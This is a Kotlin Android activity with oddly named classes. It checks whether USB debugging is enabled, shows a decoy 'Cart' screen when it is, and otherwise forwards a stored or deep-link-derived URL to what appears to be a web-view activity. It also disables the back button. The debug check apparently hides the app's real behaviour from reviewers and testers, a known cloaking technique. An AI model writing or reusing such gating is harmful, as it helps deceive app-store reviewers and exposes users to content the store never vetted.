package br.com.brainweb.i

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import br.com.Cart
import br.com.brainweb.i.databinding.ActivityMainBinding
import io.reactivex.rxjava3.core.Observable
import io.reactivex.rxjava3.schedulers.Schedulers

class StertJokers : AppCompatActivity() {

    private val binding by lazy {
        ActivityMainBinding.inflate(layoutInflater)
    }

    private lateinit var viewJoker: ViewClass

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(binding.root)
        viewJoker = ViewClass()

        if (Settings.Global.getString(
                this.contentResolver,
                Settings.Global.ADB_ENABLED
            ) != "1"
        ) {
            if (viewJoker.chBoolData(application)) {
                val inter = Intent(this, WemMyClient::class.java)
                val observable = Observable.just(viewJoker.getCart(application).toString())
                observable.map { it }
                    .subscribeOn(Schedulers.io())
                    .subscribe {
                        inter.putExtra(PUT, it)
                        startActivity(inter)
                        finish()
                    }
            } else {
                startActivity(Intent(this, ViewClass::class.java))
                finish()
            }
        }else{
            startActivity(Intent(this, Cart::class.java))
            finish()
        }
    }

    companion object {
        fun toger(stringOne: String, none: String): String {
            return if (none == "null" && stringOne == "null") {
                "organic"
            } else if (stringOne != "null") {
                stringOne.replace("myapp://", "").substringBefore("/")
            } else if (none != "null") {
                none.substringBefore("_")
            } else {
                "null"
            }
        }

        const val PUT = "link_one"
    }
    override fun onBackPressed() {
    }
}